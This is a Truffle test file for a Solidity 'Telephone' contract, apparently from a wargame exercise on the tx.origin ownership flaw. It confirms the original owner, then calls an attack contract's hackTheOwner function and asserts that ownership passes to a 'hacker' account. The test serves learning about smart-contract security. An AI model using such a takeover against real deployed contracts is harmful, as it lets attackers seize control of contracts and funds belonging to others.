const Telephone = artifacts.require("Telephone")
const TelephoneAttack = artifacts.require("TelephoneAttack")

contract("Telephone", ([owner, hacker]) => {
    let telephone
    let telephoneAttack
    
    describe('Ownership', async () => {
        beforeEach(async () => {
            telephone = await Telephone.deployed()
            telephoneAttack = await TelephoneAttack.deployed()
        })

        //contract owner confirmation
        it('confirms deployed address is contract owner', async () => {
            assert.equal(await telephone.owner().valueOf(), owner)   
            assert.notEqual(await telephone.owner().valueOf(), hacker) 
        })

        it('confirms tx origin is the caller', async () => {
            // const result = await telephone.changeOwner(owner)({ from: hacker })
            // console.log(result)
         })

        it('confirms hacker account is not contract owner', async () => {
            assert.notEqual(await telephone.owner().valueOf(), hacker) 
        })

        it('transfers ownership using Telephone attack', async () => {
            let telephoneOwner = await telephone.owner()
            assert.equal(owner, telephoneOwner)
            await telephoneAttack.hackTheOwner(telephone.address, hacker)
            telephoneOwner = await telephone.owner()
            assert.equal(hacker, telephoneOwner)
        })
        
    })

    


})
